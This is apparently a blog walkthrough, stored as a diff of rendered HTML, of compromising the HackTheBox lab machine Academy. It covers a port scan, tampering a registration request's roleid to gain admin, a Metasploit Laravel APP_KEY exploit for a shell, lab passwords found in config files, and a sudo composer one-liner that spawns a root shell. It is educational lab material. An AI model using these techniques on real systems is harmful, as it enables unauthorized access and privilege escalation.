@@ -1,0 +1,412 @@
+I"i.<hr />
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/img/htb-machines/academy/1.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<p><strong><span style="color:#06bf04">Introduction</span></strong></p>
+
+<p>Academy is easy level machine released on 07 November 2020 on HacTheBox and created by <a href="https://www.hackthebox.eu/home/users/profile/1190">egre55</a> and <a href="https://www.hackthebox.eu/home/users/profile/2984">mrb3n</a></p>
+
+<p><span style="color:#06bf04">The blog is for educational purposes only.</span></p>
+
+<hr />
+
+<p><strong><span style="color:#06bf04">Enumeration</span></strong></p>
+
+<p><strong><span style="color:#06bf04">IP-: 10.10.10.215</span></strong></p>
+
+<p>As always, I added IP In hosts file.</p>
+
+<p>Lets start with Port Scanning</p>
+
+<hr />
+
+<h1 id="nmap">Nmap</h1>
+
+<p><code class="language-plaintext highlighter-rouge">softwareuser@parrot:~ sudo nmap -sC -sS -sV -T4 -A -oN nmap/intial_scan academy.htb </code></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/img/htb-machines/academy/2.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>-sC for default scripts</strong><br />
+<strong>-sV for Version detection</strong><br />
+<strong>-sS for SYN scan </strong><br />
+<strong>-T4 for speeding up Scan</strong><br />
+<strong>-A  for Advanced and Aggressive features</strong><br /> 
+<strong>-oN for Output</strong><br /></p>
+
+<hr />
+
+<p><strong>lnmap is just my alias to print only open ports from result file</strong></p>
+
+<div class="language-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h1 id="web-page">Web Page</h1>
+
+<p>On home page we can see. A Login and Register button</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/img/htb-machines/academy/3.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Let’s register</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/img/htb-machines/academy/4.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Let’s Login with the username and password that we used to register</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/img/htb-machines/academy/5.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>successfully logged in</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/img/htb-machines/academy/5.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>now we can see some modules. but nothing more i foundon this page. so after some time i decided to intercept the request of register.php request through burpsuite also i’ll run gobuster.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/img/htb-machines/academy/6.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>register.php</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/img/htb-machines/academy/4.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>intercepting the request</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/img/htb-machines/academy/7.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>so in the request i found an intresting parameter roleid=0. Probably roleid is used here is to decide the privileges of an user or role of an user. we can change this roleid=0 to other integer and then we can that we have got some others account or we are still that normal user. also i started  gobuster</p>
+
+<p>the request</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td><td class="rouge-code"><pre>POST /register.php HTTP/1.1
+Host: academy.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 46
+Origin: http://academy.htb
+Connection: close
+Referer: http://academy.htb/register.php
+Cookie: PHPSESSID=q1nn1qd514akhbcvn68rnvghcs
+Upgrade-Insecure-Requests: 1
+
+uid=software&amp;password=123&amp;confirm=123&amp;roleid=0
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>so after changing with other numbers like 10,9,8………..1 i thought higher number will give us admin but when i changed it to 1.</p>
+
+<p>request
+![Desktop View]({{ “/assets/img/htb-machines/academy/8.png” | relative_url }})</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td><td class="rouge-code"><pre>POST /register.php HTTP/1.1
+Host: academy.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 46
+Origin: http://academy.htb
+Connection: close
+Referer: http://academy.htb/register.php
+Cookie: PHPSESSID=q1nn1qd514akhbcvn68rnvghcs
+Upgrade-Insecure-Requests: 1
+
+uid=software&amp;password=123&amp;confirm=123&amp;roleid=1
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>and i tried logged in as adminstrator account. because in gobuster i got admin.php</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/img/htb-machines/academy/9.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>and i got successfully logged in as admin</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/img/htb-machines/academy/10.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<h1 id="admin-account">Admin Account</h1>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/img/htb-machines/academy/11.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>we have got an subdomain here <code class="language-plaintext highlighter-rouge">dev-staging-01.academy.htb</code> lets add this host in hosts file.</p>
+
+<h1 id="dev-staging-01academyhtb">dev-staging-01.academy.htb</h1>
+
+<p>Let’s visit <code class="language-plaintext highlighter-rouge">dev-staging-01.academy.htb</code> and thats an laravel app</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/img/htb-machines/academy/12.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>we have got an APP_KEY <code class="language-plaintext highlighter-rouge">dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=</code></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/img/htb-machines/academy/13.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>i started googling about this app-key and started looking for exploit</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/img/htb-machines/academy/14.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>so there is a msf module to get a shell by using app key. MSF <a href="https://www.rapid7.com/db/modules/exploit/unix/http/laravel_token_unserialize_exec/">Module</a></p>
+
+<p>and we got a shell as www-data</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/img/htb-machines/academy/15.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<h1 id="www-data-shell">www-data shell</h1>
+
+<p>I need to enumerate now and after enumerating some directories i found a password in hidden file .<code class="language-plaintext highlighter-rouge">env</code></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/img/htb-machines/academy/16.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>password <code class="language-plaintext highlighter-rouge">mySup3rP4s5w0rd!!</code> these four user has shell</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/img/htb-machines/academy/17.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<h1 id="cry0l1t3--shell">cry0l1t3  shell</h1>
+
+<p><code class="language-plaintext highlighter-rouge">cry0l1t3 :</code> <code class="language-plaintext highlighter-rouge">mySup3rP4s5w0rd!!</code></p>
+
+<p>so i tried these all user one by one so  i this password is valid for user cry0l1t3 and i got user</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/img/htb-machines/academy/18.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>user cry0l1t3 can’t run sudo.
+so i ll run <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh">linPEAS</a></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/img/htb-machines/academy/19.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>So, i got a password for user <code class="language-plaintext highlighter-rouge">mrb3n</code></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/img/htb-machines/academy/20.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><code class="language-plaintext highlighter-rouge">mrb3n:</code><code class="language-plaintext highlighter-rouge">mrb3n_Ac@d3my!</code></p>
+
+<h1 id="mrb3n-shell">mrb3n shell</h1>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/img/htb-machines/academy/21.png”</td>
+      <td>relative_url}})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>so mrb3n is allowed to run sudo</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/img/htb-machines/compromised/22.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>composer Privilege escalation</p>
+
+<h1 id="root">Root</h1>
+
+<p>check here about <a href="https://gtfobins.github.io/gtfobins/composer/">composer</a></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/img/htb-machines/academy/23.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>run this to get root shell</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>
+<span class="nb">echo</span> <span class="s1">'{"scripts":{"x":"/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3"}}'</span> <span class="o">&gt;</span><span class="nv">$TF</span>/composer.json
+<span class="nb">sudo </span>composer <span class="nt">--working-dir</span><span class="o">=</span><span class="nv">$TF</span> run-script x
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>i got root.txt 
+![Desktop View]({{ “/assets/img/htb-machines/academy/24.png” | relative_url }})</p>
+
+<p>Thank you for reading my blog if you have any suggestions feel free to contact me on <a href="https://twitter.com/softwareuser_">twitter</a>.</p>
+
+:ET
